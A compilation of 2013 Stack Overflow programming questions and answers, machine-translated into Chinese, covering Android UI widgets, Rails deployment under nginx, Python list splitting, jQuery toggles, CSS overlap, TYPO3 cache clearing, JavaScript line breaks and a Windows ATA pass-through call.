# android - 链接的 AutoCompleteTextView 视图。一个中的选择更改另一个中的列表

> ID：15357820
> 
> 赞同：0
> 
> 时间：2013-03-12T09:45:09.390
> 
> 标签：android, arrays, multidimensional-array, filter, autocompletetextview

我需要输入一个位置进行调查。该位置由子地名和主地名组成。一个例子是*巴黎*（次地点）和*法国*（主要地点）。

子位置和主要位置选项在两个`AutoCompleteTextView`视图中表示。要求是，如果我首先选择一个子位置，则会自动填写主要位置。如果我首先选择一个主要位置，则子位置中的可用选项将被过滤为仅包括与所选主位置链接的子位置。*主要地点France*的示例，子地点将筛选到*Paris*、*Marseille*、*Lyon*等的选项。

对于 20000 个项目的列表，每个项目都有一个子位置和主位置，我应该使用哪种数据结构？它是一对多的数据集。

*   如何更改`AutoCompleteTextView`依赖于另一个输入的可用项目`AutoCompleteTextView`？
*   我该如何解决这种问题？打开 Activity 时，我已经看到加载时间问题，其中包含 20000 个奇怪的项目`AutoCompleteTextView`。

请有任何建议。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T09:50:36.363

我认为性能不会有太大问题。只需将数据保存在数据库中，这将为您的结构提供最简单的方法。

即使在按下主要位置的第一个字母之后，它也已经大大减少了可能性。

从子位置-> 主位置开始，您可以在显示选项列表之前放置阈值。

# ruby-on-rails - 在不同路径的同一域上部署多个 Rails 应用程序

> ID：15357827
> 
> 赞同：2
> 
> 时间：2013-03-12T09:45:47.553
> 
> 标签：ruby-on-rails, nginx, passenger

我的盒子上有两个 Rails 应用程序，一个`/opt/app1`位于`/opt/app2`. 这些应用程序中的每一个都只需要一个路由和一个控制器操作。我想做的是配置 nginx，以便导航到 www.example.com 的人会点击 app1，而导航到 www.example.com/app2 的人会点击 app2。

总结一下：不同的 Rails 应用程序，相同的域，不使用子域。

我一直在寻找如何做到这一点，但到目前为止还没有运气。这是我的第一个应用程序的基本 nginx 设置。有什么想法可以让我的第二个应用程序正常工作吗？

```
server {
    listen       80;
    server_name  example.com;
    root /opt/app1/public;
    passenger_enabled on;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T15:09:46.667

Phusion Passenger 文档告诉你如何进行这种部署

[http://www.modrails.com/documentation/Users%20guide%20Nginx.html#deploying_rails_to_sub_uri](http://www.modrails.com/documentation/Users%20guide%20Nginx.html#deploying_rails_to_sub_uri)

# python - 根据分隔符拆分列表

> ID：15357830
> 
> 赞同：26
> 
> 时间：2013-03-12T09:45:52.107
> 
> 标签：python, list, split

我有一个包含各种字符串值的列表。每当我看到`WORD`. 结果将是一个列表列表（将是原始列表的子列表），其中包含一个`WORD`我可以使用循环执行此操作的实例，但是是否有*更 Pythonic*的方法来实现这一点？

示例 =`['A', 'WORD', 'B' , 'C' , 'WORD' , 'D']`

结果 =`[['A'], ['WORD','B','C'],['WORD','D']]`

这是我尝试过的，但它实际上并没有达到我想要的效果，因为它会放在`WORD`一个不同的列表中，它应该在：

```
def split_excel_cells(delimiter, cell_data):

    result = []

    temp = []

    for cell in cell_data:
        if cell == delimiter:
            temp.append(cell)
            result.append(temp)
            temp = []
        else:
            temp.append(cell)

    return result 
```

* * *

## 回答 #1

> 赞同：37
> 
> 时间：2013-03-12T10:14:18.407

```
import itertools

lst = ['A', 'WORD', 'B' , 'C' , 'WORD' , 'D']
w = 'WORD'

spl = [list(y) for x, y in itertools.groupby(lst, lambda z: z == w) if not x] 
```

这会创建一个没有分隔符的拆分列表，这对我来说看起来更合乎逻辑：

```
[['A'], ['B', 'C'], ['D']] 
```

如果您坚持要包含分隔符，这应该可以解决问题：

```
spl = [[]]
for x, y in itertools.groupby(lst, lambda z: z == w):
    if x: spl.append([])
    spl[-1].extend(y) 
```

* * *

## 回答 #2

> 赞同：21
> 
> 时间：2013-03-12T09:54:01.617

我会使用生成器：

```
def group(seq, sep):
    g = []
    for el in seq:
        if el == sep:
            yield g
            g = []
        g.append(el)
    yield g

ex = ['A', 'WORD', 'B' , 'C' , 'WORD' , 'D']
result = list(group(ex, 'WORD'))
print(result) 
```

这打印

```
[['A'], ['WORD', 'B', 'C'], ['WORD', 'D']] 
```

该代码接受任何可迭代对象，并生成一个可迭代对象（如果您不想*将*其展平为列表，则不必将其展平）。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-03-12T10:03:13.620

*   @NPE 的解决方案对我来说看起来很 Pythonic。这是另一个使用`itertools`：
*   `izip`特定于 python 2.7。替换`izip`为`zip`在 python 3 中工作

```
from itertools import izip, chain
example = ['A', 'WORD', 'B' , 'C' , 'WORD' , 'D']
indices = [i for i,x in enumerate(example) if x=="WORD"]
pairs = izip(chain([0], indices), chain(indices, [None]))
result = [example[i:j] for i, j in pairs] 
```

*   此代码主要基于[此答案](https://stackoverflow.com/questions/1198512/split-a-list-into-parts-based-on-a-set-of-indexes-in-python#1198876)。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2018-07-14T00:06:36.583

**给定**

```
import more_itertools as mit

iterable = ["A", "WORD", "B" , "C" , "WORD" , "D"]
pred = lambda x: x == "WORD" 
```

**代码**

```
list(mit.split_before(iterable, pred))
# [['A'], ['WORD', 'B', 'C'], ['WORD', 'D']] 
```

[`more_itertools`](https://github.com/erikrose/more-itertools)是一个第三方库，可通过`> pip install more_itertools`.

另见[`split_at`](https://more-itertools.readthedocs.io/en/stable/api.html#more_itertools.split_at)和[`split_after`](https://more-itertools.readthedocs.io/en/stable/api.html#more_itertools.split_after)。

# jquery - jQuery，检测元素是否已经切换

> ID：15357832
> 
> 赞同：7
> 
> 时间：2013-03-12T09:45:53.883
> 
> 标签：jquery, toggle

我需要使用 jQuery 来了解我页面上的元素是否已经切换。

我有一个包含 XXX 元素的菜单。

当我点击一个元素时，我使用：`$("#elementXX").slideToggle("slow");`（XX 是一个数字）

如果我点击另一个元素，我需要知道一个元素是否已经切换，并且我需要先关闭这个元素才能滑动切换我的新元素。

我怎样才能做到这一点 ？我不能像 #element1、#element2、#element3 等那样按 id 检查 id。

谢谢 ！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-12T09:56:32.610

您不需要切换，`slideUp`并且`slideDown`更适合您的场景。你可以简单地做：

```
$("#clickedItem").click(function () {
    var wasVisible = $("#elementXX").is(":visible");
    $("[id^=element]:visible").stop().slideUp("slow");
    if (!wasVisible) {
        $("#elementXX").slideDown("slow");
    }
}); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-12T09:47:17.293

您可以将数据属性设置为某个值以了解它是否已切换。您可以在html中添加属性或使用脚本直接添加。

```
$("#elementXX").data("toggled", "true"); 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2018-03-27T11:01:01.920

根据jQuery官网FAQ：

```
$("#toggleButton").click(function () {
   if ($("#elementXX").is(":visible")) {
      // toggled down
   }
   if ($("#elementXX").is(":hidden")) {
      // toggled up
   }
}); 
```

[https://learn.jquery.com/using-jquery-core/faq/how-do-i-determine-the-state-of-a-toggled-element/](https://learn.jquery.com/using-jquery-core/faq/how-do-i-determine-the-state-of-a-toggled-element/)

# ruby-on-rails - 如何使用 websocket-rails gem 创建国际象棋自动匹配器？

> ID：15357834
> 
> 赞同：0
> 
> 时间：2013-03-12T09:45:55.677
> 
> 标签：ruby-on-rails, websocket

我想使用 websockets 制作一个 Rails 国际象棋应用程序，它会自动匹配具有相似技能的玩家。

Rails 的典型设置包括多个后端 Rails 进程，每个进程在请求之间基本上是无状态的。此外，通常多个后端不直接相互通信。

如果许多玩家都有到不同后端的 websocket 连接，那么自动匹配器将如何工作？自动匹配器会查看所有想要玩的玩家并适当地匹配他们。这似乎是一个有状态的集中式算法，违背了多个独立的后端 Rails 进程的粒度。

鉴于这两个相互冲突的方面，是否有一种在 Rails 中制作自动匹配器的可取的惯用方法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T10:14:20.337

我还没有真正做过这样的事情，但我也许可以为您指出正确的方向：

你应该看看[socket.io](http://socket.io/#how-to-use)、 redis 和[socket.io-cluster](https://github.com/muchmala/socket.io-cluster)

我找到了一个[幻灯片](https://speakerdeck.com/conferencesbox/socket-dot-io-in-chess-realtime-multiplayer-web-application)，也许你可以和作者联系。

# android - 显示活动时调用微调器上的 setOnItemSelectedListener

> ID：15357837
> 
> 赞同：1
> 
> 时间：2013-03-12T09:46:05.967
> 
> 标签：android, spinner, tabactivity

我需要更改我的应用程序的语言。为此，我有一个微调器，其中包含我的应用程序所需的所有语言。这是我如何使用它：

```
private Spinner language;
ArrayAdapter<String> adapter = new ArrayAdapter<String>(this, R.layout.my_spinner_textview, languages);
        adapter.setDropDownViewResource(R.layout.multiline_spinner_dropdown_item);
language.setAdapter(adapter);
language.setSelection(Integer.valueOf(languageId) - 1);
language.setOnItemSelectedListener(new CustomOnItemSelectedListener()); 
```

其中 CustomOnItemSelectedListener() ：

```
private class CustomOnItemSelectedListener implements OnItemSelectedListener {

        public void onItemSelected(AdapterView<?> parent, View view, int pos, long id) {
            Log.v(TAG, String.valueOf(language.getSelectedItemId() + 1));

             fsmApplication.setPreferredLanguageShortName(language.getSelectedItem());
             finish();
             Intent i4 = new Intent(SettingsActivity.this,
             AccountActivity.class);
             startActivity(i4);
        }

        public void onNothingSelected(AdapterView<?> arg0) {
        }

    } 
```

问题很奇怪。此代码在 SettingsActivity.class 中，并且位于 Tab 内部（它代表第二个选项卡）。当我单击此选项卡（第二个）时，应用程序立即进入第一个选项卡（包含 AccountActivity 类）。这意味着当我单击选项卡时会调用 setOnItemSelectedListener。为什么会这样？这是我的 SettingActivity.class：[http ://pastebin.com/vLfZe61b](http://pastebin.com/vLfZe61b)

欢迎任何想法。提前致谢。

# html - div相对重叠

> ID：15357840
> 
> 赞同：0
> 
> 时间：2013-03-12T09:46:12.573
> 
> 标签：html, css, positioning, overlap

我有 3 个 div。我需要得到这些重叠，但我***不能使用绝对定位***。我怎样才能做到这一点？我的目标是在响应式布局上工作（**没有修复 px 值**）

```
 <div id="hold" style="background-color: #CCCCCC;padding: 10px">
        <div id="first" style="width: 100px;height: 100px;background-color: red;z-index: 1"></div>
        <div id="sec" style="width: 100px;height: 100px;background-color: greenyellow;z-index: 3"></div>
        <div id="third" style="width: 100px;height: 100px;background-color: #a3dbec;z-index: 5"></div>
    </div> 
```

我使用了以下CSS。

```
 #first,#sec,#third{
            margin: 0 auto;
            position: relative;
            top: 0;
        } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-12T09:48:19.017

设置`margin-top`：

```
#sec
{
    margin-top: -100px;
}
#third
{
    margin-top: -100px;
} 
```

[http://jsfiddle.net/EPq6Z/](http://jsfiddle.net/EPq6Z/)

# wpf - 在一个 XamDataGrid 列中显示项目集合

> ID：15357842
> 
> 赞同：1
> 
> 时间：2013-03-12T09:46:13.073
> 
> 标签：wpf, infragistics, xamdatagrid

我使用 infragistics XamDataGrid，在一列中显示项目集合（使用 listView 作为 CellValuePresenter ControlTemplate）。问题是我无法过滤此字段。作为过滤器，我想在字段集合中使用不同的项目值。

谁能建议如何更改字段过滤器样式以过滤带有项目集合的字段？

# php - 如何从外部脚本清除 Typo3 中的缓存？

> ID：15357844
> 
> 赞同：1
> 
> 时间：2013-03-12T09:46:27.483
> 
> 标签：php, caching, typo3

我确实有一个 PHP 脚本，它不是 Typo3 的扩展。现在我想从这个脚本中删除 Typo3 的整个缓存。这怎么可能？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-12T10:13:09.603

1.  安装 TYPO3 扩展[cleartypo3cache](https://extensions.typo3.org/extension/cleartypo3cache/)
2.  在 PhpStorm 4 中创建一个工具和一个键盘快捷键来触发 cleartypo3cache
3.  推送到远程主机时使用无密码公钥身份验证的 SSH 访问。

安装扩展“ `cleartypo3cache`”并创建 BE 用户“ `_cli_cleartypo3cache`”并添加以下 TSconfig：

```
options.clearCache.all=1
options.clearCache.pages=1 
```

现在测试缓存是否被清除：

```
$ cd /path/tp/typo3-site/
$ php typo3/cli_dispatch.phpsh cleartypo3cache all 
```

如果您的网络服务器在本地主机上，那么您很幸运，因为您不需要这个 shell 脚本。如果您的网络服务器位于远程主机上，则需要一个额外的包装脚本。这是因为 PhpStorm 没有为远程主机目录提供环境变量。您必须为包装脚本中的每个项目静态设置此目录：

```
#!/bin/sh

TYPO3_SITE_PATH="/path/to/typo3-site"
USER="alice"
HOST="example.com"

/usr/bin/ssh $USER@$HOST '/usr/bin/php $TYPO3_SITE_PATH/typo3/cli_dispatch.phpsh cleartypo3cache all' 
```

将此文件保存在项目文件目录中的 .idea/clear-typo3-cache.sh 中并使其可执行：

```
$ chmod 755 .idea/clear-typo3-cache.sh 
```

**PhpStorm 外部工具** 您需要在 PhpStorm 中创建一个“外部工具”才能清除缓存。

1.  转到 PhpStorm--> 设置--> 外部工具--> 添加...
2.  为您的工具命名和组，例如“部署”->“清除 TYPO3 缓存”
3.  停用复选框“打开控制台”和“菜单->搜索结果”

**远程主机场景**

将以下行添加到“程序：”

```
$ProjectFileDir$/.idea/clear-typo3-cache.sh 
```

本地主机方案

将此行添加到“程序：”

```
$PhpExecutable$ 
```

将此行添加到“参数：”

```
$ProjectFileDir$/typo3/cli_dispatch.phpsh cleartypo3cache all 
```

您需要在 PhpStorm-->Settings-->PHP 中配置 PHP 解释器才能使用 $PhpExecutable$。或者，您可以使用 /usr/bin/php [（来源：][[t3node.com](http://www.t3node.com/fileadmin/user_upload/images/phpstorm-external-tools-typo3-cache.png)][）][![](../Images/6aa1bd511c7d650cbccb4a3daccaeb9d.png)](https://i.stack.imgur.com/JlEB8.png)

**PhpStorm Keymap** 我建议使用与保存或远程主机上传相同的键绑定：

转到 PhpStorm--> 设置--> 键盘映射

对于远程主机方案，导航到：主菜单-->工具-->部署-->上传到默认服务器。注意现有的快捷方式。如果您没有，请创建一个新的（我使用 ALT+SHIFT+U） 对于 localhost 方案，只需使用 Ctrl+S（主菜单-->文件-->全部保存）。

1.  现在导航到您创建的外部工具（例如外部工具-->部署->清除 TYPO3 缓存）
2.  右键单击“添加键盘快捷键”
3.  在“First Stroke”中创建特定的快捷方式

现在 PhpStorm 将警告您该快捷方式已被用于不同的命令。没关系，这正是我们想要的。

就是这样。当您在键盘上点击保存或上传时，您的 TYPO3 缓存始终会被清除。

改编自[t3node](https://stmllr.net/blog/clearing-typo3-cache-in-phpstorm/)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-03-13T13:12:35.147

我自己找到了解决方案，它实际上很容易。我查看了**t3lib**文件夹中的**class.t3lib_tcemain.php**。那里你有必要的命令来清除缓存。它还会检查您是否启用了缓存框架。如果是这样，您还需要截断其他一些表（以**cachingframework_cache_ 开头**）

基本上是：

```
<?php

 require_once('./typo3conf/localconf.php');

 $conn = mysql_connect($typo_db_host, $typo_db_username, $typo_db_password);
 mysql_select_db($typo_db);

 // Clear Cache here
 mysql_query("TRUNCATE cache_treelist;");
 mysql_query("TRUNCATE cache_pagesection;");
 mysql_query("TRUNCATE cache_hash;");
 mysql_query("TRUNCATE cache_pages;");
 if($handle = opendir('./typo3conf')) {
    while (false !== ($file = readdir($handle))) {
        if(strpos($file, 'temp_CACHED_')!==false) {
            unlink('./typo3conf/'.$file);
        }
    }
    closedir($handle);
 }

?> 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2014-04-23T07:10:39.060

**TYPO3 >= 7**

从 TYPO3 7 开始，您可以安装 Helmut Hummels Extensiontypo3_console。然后您可以清除缓存，例如（对于作曲家安装）：

```
./vendor/bin/typo3cms cache:flush 
```

[https://extensions.typo3.org/extension/typo3_console/](https://extensions.typo3.org/extension/typo3_console/)

[https://github.com/TYPO3-Console/TYPO3-Console](https://github.com/TYPO3-Console/TYPO3-Console)

**TYPO3 6.x**

首先在你的类中初始化服务

```
/**
 * @var Tx_Extbase_Service_CacheService
 */
protected $cacheService;

/**
 * @param Tx_Extbase_Service_CacheService $cacheService
 * @return void
 */
public function injectCacheService(Tx_Extbase_Service_CacheService $cacheService) {
    $this->cacheService = $cacheService;
} 
```

在你的函数中调用

```
$this->cacheService->clearPageCache($pids); 
```

而 $pids 是整数（单页）或整数数组（多页）

见：[http ://typo3.org/api/typo3cms/class_t_y_p_o3_1_1_c_m_s_1_1_extbase_1_1_service_1_1_cache_service.html](http://typo3.org/api/typo3cms/class_t_y_p_o3_1_1_c_m_s_1_1_extbase_1_1_service_1_1_cache_service.html)

在 TYPO3 自 4.5 以来（我认为）它是一个静态方法，所以你只需要调用

```
Tx_Extbase_Utility_Cache::clearPageCache($pids); 
```

在您的控制器中。

在这里找到它：[http ://www.phpkode.com/source/p/typo-cms/typo3_src+dummy-4.6.5/typo3/sysext/extbase/Classes/MVC/Controller/ActionController.php](http://www.phpkode.com/source/p/typo-cms/typo3_src+dummy-4.6.5/typo3/sysext/extbase/Classes/MVC/Controller/ActionController.php)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-14T13:20:25.397

在 FLOW3 中，有可能做这样的事情，据我所知，TYPO3 v.4.x 你没有这样的默认 CLI 选项，所以你应该使用或你自己的脚本，或使用诸如**[cleartypo3cache](http://typo3.org/extensions/repository/view/cleartypo3cache)**或**[Cli Cleaner](http://typo3.org/extensions/repository/view/clicleaner)**之类的扩展。

我还制作了一个 bash 脚本来清理您的 dB 缓存表：[https ://gist.github.com/fedir/5162747](https://gist.github.com/fedir/5162747)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-11-15T18:22:44.183

在typo3 6.x extbase 中它很简单。

**编辑：** clearPageCache 不是静态的，那么你需要创建 CacheService 的对象

TYPO3\CMS\Extbase\Service\CacheService::clearPageCache(pageUid);

# javascript - 如何在 Javascript 连接的字符串上强制换行？

> ID：15357846
> 
> 赞同：56
> 
> 时间：2013-03-12T09:46:31.203
> 
> 标签：javascript, concatenation

我将变量作为连接字符串发送到文本框，因此我可以在 getElementById 调用中包含多个变量。

**我需要指定一个换行符，以便正确格式化地址。**

```
document.getElementById("address_box").value = 
(title + address + address2 + address3 + address4); 
```

我已经在换行符和变量之后尝试了 \n 。并尝试将连接运算符更改为 +=。

***已修复*****：此问题已通过以下方式解决；**

```
document.getElementById("address_box").value = 
(title + "\n" + address + "\n" + address2 + "\n" +  address3 +  "\n" + address4); 
```

**并将文本框从“输入类型”更改为“文本区域”**

* * *

## 回答 #1

> 赞同：59
> 
> 时间：2013-03-12T09:50:05.497

你不能在一个文本框中有多行，你需要一个文本区域。然后它`\n`在值之间起作用。

* * *

## 回答 #2

> 赞同：24
> 
> 时间：2013-03-12T09:47:51.280

```
document.getElementById("address_box").value = 
(title + "\n" + address + "\n" + address2 + "\n" + address3 + "\n" + address4); 
```

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2013-03-12T09:48:44.550

您需要使用`\n`内引号。

`document.getElementById("address_box").value = (title + "\n" + address + "\n" + address2 + "\n" + address3 + "\n" + address4)`

`\n`被称为`EOL`或`line-break`，`\n`是一个常见的`EOL`标记，通常被称为`LF`或`line-feed`，它是一个特殊`ASCII`字符

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2020-01-13T08:52:51.727

使用**反引号**

反引号通常用于多行字符串，或者当您想要在字符串中插入表达式时

```
let title = 'John';
let address = 'address';
let address2 = 'address2222';
let address3 = 'address33333';
let address4 = 'address44444';
document.getElementById("address_box").innerText = `${title} 
${address}
${address2}
${address3} 
${address4}`;
```

```
<div id="address_box">
</div>
```

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2021-08-23T13:24:10.307

这是一个有趣的方式来回答你的问题。下面将获取一个字符串列表，对其进行排序，然后`r`用逗号和空格添加值。每三个值都会增加一个换行符。

```
let r="";
["red", "blue", "Blue", "green"].sort().forEach((e, i) => {
   r += e + ", "
   if (i % 3 == 2) 
      r += "\n";
});
console.log(r); 
```

# android - 单击按钮时无法在android中链接xml布局

> ID：15357849
> 
> 赞同：0
> 
> 时间：2013-03-12T09:46:43.820
> 
> 标签：android, button, linker

我是 android 的新手，我正在开发一个应用程序。我在单击按钮时将第 2 页链接到第 3 页时遇到问题。我曾试图解决这个问题，但它不起作用。下面是我的 AndroidManifest.xml `

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.fyp"
    android:versionCode="1"
    android:versionName="1.0" >

    <uses-sdk
        android:minSdkVersion="8"
        android:targetSdkVersion="15" />

    <application
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/AppTheme" >
        <activity
            android:name=".MainActivity"
            android:label="@string/title_activity_main" >
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <activity 
            android:name=".BelajarActivity"
            android:label="@string/title_activity_main">

        </activity>
        <activity 
            android:name=".KnamaActivity"
            android:label="@string/title_activity_main">
        </activity>
    </application>

</manifest> 
```

下面是 BelajarActivity.java

```
package com.example.fyp;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;

public class BelajarActivity extends Activity {

    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.belajar);

        Button bnama = (Button) findViewById(R.id.knama);
        bnama.setOnClickListener(new Button.OnClickListener() {

            @Override
            public void onClick(View v) {
                Intent namaIntent = new Intent(BelajarActivity.this,KnamaActivity.class);
                startActivity(namaIntent);
            }
        });

    }

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T09:51:25.980

只需更改此行

```
bnama.setOnClickListener(new View.OnClickListener() { 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T09:49:20.950

这个

```
 bnama.setOnClickListener(new Button.OnClickListener() { //this is wrong

          ...
        }); 
```

应该

```
 bnama.setOnClickListener(new View.OnClickListener() {
..
}); 
```

OnClickListener 应该是 View 类型

# windows - IOCTL_ATA_PASS_THROUGH_DIRECT 在 Windows8 中失败

> ID：15357856
> 
> 赞同：0
> 
> 时间：2013-03-12T09:47:07.177
> 
> 标签：windows, ioctl, ata

**这是我的示例代码：**

```
PATA_PASS_THROUGH_DIRECT pATAPTD = NULL;
DWORD dataSize = sizeof(ATA_PASS_THROUGH_DIRECT) + 512;
pATAPTD = (PATA_PASS_THROUGH_DIRECT) VirtualAlloc(NULL, dataSize, MEM_COMMIT, PAGE_READWRITE);
ZeroMemory(pATAPTD, dataSize); 
pATAPTD->Length = sizeof(ATA_PASS_THROUGH_DIRECT); 
pATAPTD->DataBuffer = (PVOID)((char*)pATAPTD + sizeof(ATA_PASS_THROUGH_DIRECT));
pATAPTD->DataTransferLength = 512; 
pATAPTD->TimeOutValue =  25;
pATAPTD->AtaFlags = 25;

unsigned short* pPassWrdBuffer = NULL;
pPassWrdBuffer = new unsigned short[256];
memset(pPassWrdBuffer,0,512);
pPassWrdBuffer[1]= Password;

char *pDataPtr = (char *)((char *)pATAPTD + sizeof(ATA_PASS_THROUGH_DIRECT));

memcpy_s((void *)( pDataPtr ), 512,
pPassWrdBuffer, 512);

pATAPTD->CurrentTaskFile[1] = 0x01;
pATAPTD->CurrentTaskFile[6] = 0xF1;

bResult = DeviceIoControl(m_hDisk, 
            IOCTL_ATA_PASS_THROUGH_DIRECT, 
            pATAPTD, 
            dataSize,/* input buffer and size */ 
            pATAPTD,
            dataSize,/* output buffer and size */ 
            &BytesCopied,/* bytes copied to output buffer*/ 
            NULL/* no overlapping */  
            ); 
```

此调用仅在 Windows 8 和 Windows Server 2012 上失败，并抛出消息“参数不正确”（@err = 87）。它在 Windows 7 上运行良好。任何人都可以为这个问题提供一些解决方案吗？

# flash - 在 Actionscript 3.0 中编写车速表 + 转速表

> ID：15357863
> 
> 赞同：-1
> 
> 时间：2013-03-12T09:47:37.827
> 
> 标签：flash, actionscript

我需要在 Flash Professional 中的 Actionscript 3.0 中创建一个速度计和一个转速计。

我搜索了 Stackoverflow 并在 Google 上搜索了代码和示例，但我找不到任何可以使用的东西。大多数结果都指向 Android 应用程序。

我在使用 AS 编码动画方面的经验也接近于零。

我需要做的是让仪表的指针按照一定的公式移动。公式不需要精确，只要符合逻辑即可。

当我按住一个键时，指针会移动，当我松开时，指针会反转到“0”。针也不能超过限制。

这可能吗？我曾尝试将代码放在一起，但它们似乎并没有引导我以正确的方式。我也被告知这很难。

现在我正在阅读 Rob Huddleston 的一本书，名为 Actionscript，这本书对我有帮助吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T09:51:56.267

这一点都不难。最简单的方法是画针，将针的中心移动到与仪表相连的位置，然后根据函数的返回值编辑针的旋转属性。为您提供了非常快速的示例以帮助您入门：[http ://www.upload.ee/files/3141514/gauge.fla.html](http://www.upload.ee/files/3141514/gauge.fla.html)

# android - 应用程序中的搜索栏

> ID：15357866
> 
> 赞同：0
> 
> 时间：2013-03-12T09:47:51.663
> 
> 标签：android, android-layout, search, searchbar

我正在开发一个应用程序。在其中显示数据来自 SQLite 数据库的列表视图。我在 String[] 中获取数据。

现在应用程序的需要是：我想在活动顶部添加一个搜索栏。此搜索栏应仅对活动上显示的列表执行搜索。

当用户在搜索栏中键入一个字母时，所有数据都应显示在包含该字母的列表视图中。

我尝试了以下代码。

在 main.java

```
EditText search= (EditText) findViewById(R.id.edittext_searchbar);
search.addTextChangedListener(new TextWatcher() {
    public void onTextChanged(CharSequence s, int start, int before, int count) {
    adapter.getFilter().filter(s);
        adapter.notifyDataSetChanged();
    }   
    public void beforeTextChanged(CharSequence s, int start, int count,int after) {
    }
    @Override
    public void afterTextChanged(Editable s) {
    }
    });
listView.setAdapter(adapter); 
```

在适配器类中：

```
public void setData(String[] menuList) {   
    menuListofAdapter = menuList;//contains class items data.
}

@Override
public Filter getFilter() {
    return new Filter() {
    @Override
    protected void publishResults(CharSequence constraint, FilterResults results) {
        if (results != null && results.count >= 0) {
        setData((String[]) results.values);//if results of search is null set the searched results data
    } else {
                setData(menuListofAdapter);// set original values
            }
            notifyDataSetInvalidated();
        }

        @SuppressWarnings("null")
        @Override
        protected FilterResults performFiltering(CharSequence constraint) {
            FilterResults result = new FilterResults();
            if (!TextUtils.isEmpty(constraint)) {
                constraint = constraint.toString();
                String[] fItem = null;
                if(Utility.mainMenuList!=null){
                    for(int i=0,j=0;i<Utility.mainMenuList.length;i++){
                    if (Utility.mainMenuList[i].equalsIgnoreCase(constraint.toString())) {
                             fItem[j] = Utility.mainMenuList[i];
                         j=j+1;
                     }else{
                     }
                 }
             }
             result.count = fItem.length;
             result.values = fItem;
         } else{
             result.count=-1;// no search results found
         }             
         return result;
        }
     };
 } 
```

我应该为此做些什么。数据在 String[] 中。在列表视图中显示。

请建议我需要进行哪些更改。

当我应用上面的代码并运行我的应用程序并尝试搜索时，出现以下错误：

```
03-12 18:16:19.215: D/AndroidRuntime(836): Shutting down VM
03-12 18:16:19.215: W/dalvikvm(836): threadid=1: thread exiting with uncaught exception (group=0x40015560)
03-12 18:16:19.215: E/AndroidRuntime(836): FATAL EXCEPTION: main
03-12 18:16:19.215: E/AndroidRuntime(836): java.lang.ClassCastException: java.util.ArrayList
03-12 18:16:19.215: E/AndroidRuntime(836):  at com.abc.example.adapters.MyListAdapter$1.publishResults(MainMenuListAdapter.java:41)
03-12 18:16:19.215: E/AndroidRuntime(836):  at android.widget.Filter$ResultsHandler.handleMessage(Filter.java:282)
03-12 18:16:19.215: E/AndroidRuntime(836):  at android.os.Handler.dispatchMessage(Handler.java:99)
03-12 18:16:19.215: E/AndroidRuntime(836):  at android.os.Looper.loop(Looper.java:123)
03-12 18:16:19.215: E/AndroidRuntime(836):  at android.app.ActivityThread.main(ActivityThread.java:3683)
03-12 18:16:19.215: E/AndroidRuntime(836):  at java.lang.reflect.Method.invokeNative(Native Method)
03-12 18:16:19.215: E/AndroidRuntime(836):  at java.lang.reflect.Method.invoke(Method.java:507)
03-12 18:16:19.215: E/AndroidRuntime(836):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:839)
03-12 18:16:19.215: E/AndroidRuntime(836):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:597)
03-12 18:16:19.215: E/AndroidRuntime(836):  at dalvik.system.NativeStart.main(Native Method) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T09:55:33.440

根据您的要求，您必须在 android 中使用分段列表视图。请看这个链接。 [http://samir-mangroliya.blogspot.in/2012/05/android-sectioned-listview-with-search_6865.html](http://samir-mangroliya.blogspot.in/2012/05/android-sectioned-listview-with-search_6865.html)。它将对您有很大帮助。让我知道您有任何疑问。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T10:16:39.743

在列表视图的顶部有一个编辑文本。我建议你有一个自定义列表适配器。

拥有数据库的原始值列表。

有另一个列表来设置临时数据以匹配搜索条件。

如果您的搜索条件与列表中的一个匹配，则将其添加到 founditmes 并在列表中显示数据。如果不匹配，则在列表中显示原始数据。

我已经给出了一个大概的想法。下面的代码可以根据你的需要进行修改。我自己实现了搜索并且它有效。

我在 SO 中问了一个问题，我从[如何根据 Android 中 POJO 类的类项在 CustomListView 中实现搜索得到了答案？](https://stackoverflow.com/questions/13090046/how-to-implement-search-in-customlistview-based-on-class-item-of-pojo-class-in-a).

试试下面的，如果你不能让它工作，你可以随时在 SO 中发布一个问题。

```
 search= (EditText) findViewById(R.id.search);
     //look for text changing in edittext.
     search.addTextChangedListener(new TextWatcher() {

         public void onTextChanged(CharSequence s, int start, int before, int count) {
                         youradapter.getFilter().filter(s);
                         youradapter.notifyDataSetChanged();

         }

         public void beforeTextChanged(CharSequence s, int start, int count,
             int after) {

           }

           public void afterTextChanged(Editable s) {
           }
          }); 
```

